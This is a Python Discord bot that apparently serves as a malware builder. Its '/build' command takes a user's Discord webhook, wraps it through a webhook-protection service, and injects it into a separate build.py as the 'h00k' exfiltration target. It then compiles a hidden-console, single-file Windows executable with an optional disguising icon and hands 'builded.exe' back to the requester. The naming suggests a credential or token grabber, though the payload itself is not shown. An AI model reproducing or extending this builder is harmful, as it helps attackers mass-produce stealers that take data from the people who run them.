import asyncio
import json
import os
import random
import shutil
import string
import subprocess

import discord
import requests
from discord import app_commands
from discord.ext import commands

TOKEN = "DISCORD_TOKEN_HERE"

intents = discord.Intents.all()
client = commands.Bot(command_prefix="+", intents=intents)


@client.event
async def on_ready():
    print(f"We have logged in as {client.user}")
    await client.tree.sync()


async def execute_build(interaction, webhook, icon, dist_path):
    response = requests.post("https://webhook.my/create", data={"webhook": webhook})
    response_data = response.json()
    print(response_data)
    if response.status_code == 200 and "protected_url" in response_data:
        headers = {"content-type": "application/json"}
        msg = f"{interaction.user.mention} tried to build <@&1328459587514273843>"
        data = {"content": msg}
        requests.post(
            "DISCORD_WEBHOOK_URL",
            data=json.dumps(data),
            headers=headers,
        )

        replace_webhook(response_data["protected_url"])

        random_string = "".join(
            random.choices(string.ascii_lowercase + string.digits, k=8)
        )

        os.makedirs(dist_path)

        icon_option = ""
        if icon is not None:
            if icon.filename.endswith(".ico"):
                icon_path = os.path.join(dist_path, icon.filename)
                await icon.save(icon_path)
                icon_option = f' --icon="{icon_path}"'
            else:
                await interaction.followup.send(
                    content="The attachment file is not a .ico file.", ephemeral=True
                )
                return

        build_command = f"cmd.exe /c pyinstaller build.py --noconsole --onefile{icon_option} --distpath {dist_path}"
        process = await asyncio.create_subprocess_shell(
            build_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )

        stdout, stderr = await process.communicate()

        if process.returncode == 0:
            exe_path = os.path.join(
                dist_path, "build.exe" if os.name == "nt" else "creal"
            )

            if os.path.exists(exe_path):
                renamed_path = os.path.join(dist_path, "builded.exe")
                os.rename(exe_path, renamed_path)
                with open(renamed_path, "rb") as exe_file:
                    await interaction.followup.send(
                        content="Build completed",
                        file=discord.File(exe_file, filename="builded.exe"),
                        ephemeral=True,
                    )
                shutil.rmtree(dist_path)
            else:
                await interaction.followup.send(
                    content="Build failed. Executable not found.", ephemeral=True
                )
                shutil.rmtree(dist_path)
        else:
            await interaction.followup.send(
                content=f"Build failed with error: {stderr.decode()}", ephemeral=True
            )
            shutil.rmtree(dist_path)
    else:
        await interaction.followup.send(response_data["message"], ephemeral=True)
    shutil.rmtree(dist_path)


@client.tree.command(name="build")
async def build(
    interaction: discord.Interaction, webhook: str, icon: discord.Attachment = None
):
    await interaction.response.send_message("Building now...", ephemeral=True)
    dist_path = os.path.join(os.getcwd(), f"dist_{random.randint(0, 1000000)}")
    await asyncio.create_task(execute_build(interaction, webhook, icon, dist_path))


def replace_webhook(webhook):
    file_path = "./build.py"
    with open(file_path, "r", encoding="utf-8") as file:
        lines = file.readlines()

    for i, line in enumerate(lines):
        if line.strip().startswith("h00k ="):
            lines[i] = f'h00k = "{webhook}"\n'
            break

    with open(file_path, "w", encoding="utf-8") as file:
        file.writelines(lines)


client.run(TOKEN)
